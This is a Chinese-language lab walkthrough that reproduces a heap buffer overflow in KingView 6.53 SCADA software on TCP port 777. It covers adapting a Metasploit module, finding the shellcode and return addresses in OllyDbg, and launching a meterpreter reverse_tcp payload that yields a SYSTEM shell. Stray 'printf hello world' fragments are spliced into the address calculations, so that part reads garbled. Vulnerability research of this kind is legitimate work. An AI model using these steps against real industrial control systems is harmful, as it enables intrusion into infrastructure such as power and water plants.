01

介绍

产品描述
Kingview是亚控公司推出的第一款针对中小型项目推出的用于监视与控制自动化设备和过程的SCADA产品，是一款高性能产品，广泛用于电力、水利、建筑、煤矿、环保、冶金等领域，可用于构建数据信息自动化领域的服务平台。


漏洞描述
该漏洞利用了Kingview 6.53版本中HistorySvr.exe基于堆的缓冲区溢出漏洞。攻击者可以通过对TCP端口777发送特殊请求来执行任意代码。


漏洞影响
Kingview == 6.53



02

环境配置

环境准备
攻击机kali：192.168.7.129
靶机win xp sp3 CH：192.168.7.45
工业软件：KingView 6.53
OD（无插件原版）


 软件安装

下载地址：http://www.icpdas-usa.com/documents/king/kingview6.53_EN.rar

软件介绍：https://www.icpdas-usa.com/documents/KingView_Quick_Start_Manual.pdf

下载后解压，选择Setup。

安装 Kingview，一路默认即可。
安装完成后选择Exit，退出即可（退出后会提示安装driver，选择安装就好）。
安装完成后HistorySvr.exe进程会自动运行，同时打开TCP 777端口。




03

漏洞复现

测试poc导入

由于Poc只包含Win_xp_sp1以及Win_xp_sp3_EN系统，而我们测试的系统为Win_xp_sp3_CH，因此需对Poc进行需求更改。
需要更改的地方有两处，先复制一行Targets出来，Ret地址可暂时随意填写（这里为了方便，直接选择了EN地址）。
第二处为exploit，我们需要复制出来一个Targets指向的shellcode。此处代码可考虑复制EN处，ABCD为方便快速定位shellcode所随意填写的字符串，可更改。
最后将我们的poc按照msf命名规则命名后导入msf，然后reload_all加载模块即可。
加载模块不报错即可，报错可根据提示查看报错日志，定位错误。


 shllcode定位
接下来就是我们shellcode位置的确定了，由于我们不知道具体shellcode位置，此处需要用到OD，来判断异常位置。这里我们采用原版OD（之所以不用吾爱上的是因为插件过多，会出现如下报错，貌似是因为插件的原因导致的）。
当然，我们使用OD之前也需要配置一下。这里采用的是英文原版OD，吾爱上也可以搞到。
打开后会直接报错，是因为路径导致的错误，不修改也只是没有办法保存调试历史，无伤大雅。
想要更改的话，修改Options -> Appearance -> Directories下的路径即可。
我们想要借助OD来判断shellcode位置，需要打开我们的实时调试，从而附加我们的异常进程。
Options -> Just-in-time-debugging，打开Make OllyDbg...即可。

接下来就是借助msf来进行攻击了。

use exploit/windows/scada/kingview_overflow_attack      //选择攻击模块set payload windows/meterpreter/reverse_tcp             //选择payloadset rhosts 192.168.7.45                                 //指定目的IP（靶机）set lhost 192.168.7.129                                 //指定源IP（攻击机）set target 2                                            //指定攻击系统
//这里的target一定要是2，因为我们在脚本中Targets的位置为2，因此选择的是我们的xp CH系统

此时OD捕获到了异常进程，断在了0x00384342处。

 在内存中搜索字符串ABCD，定位到地址为0x013004C0。

printf("hello worlshellcode地址：0x013004C0 + 0x4 = 0x013004C4
//由于设置的ABCD为4个字符（因为shellcode地址也为4字符，所以设置了长度为4的字符。设置其余长度的字符也可以成功捕获异常，不过脚本中的前置填充数据长度也要修改，但对后续位置的确定以及脚本的编写会有影响，导致不准确。）
因此我们shellcode长度要加0x4，最终值为 0x013004C4d!");
printf("hello wRet地址：0x013004C0 - 0xC = 0x013004B4
//Ret地址要根据我们的异常点call函数来判断CALL DWORD PTR DS:[EAX+C]因此我们Ret的实际地址要减去0xC，最终值为 0x013004B4orld!");


正式poc构造

根据上一步得到的shellcode地址以及Ret地址来修改我们的Poc。


msf反弹shell
修改完Poc后，将我们更改后的Poc重新导入msf，然后进行攻击（记得重新开启靶机的HistorySvr.exe服务，开启这个服务后777端口也会自动开启）。
msf反弹shell成功，并用getsystem成功提到root权限。
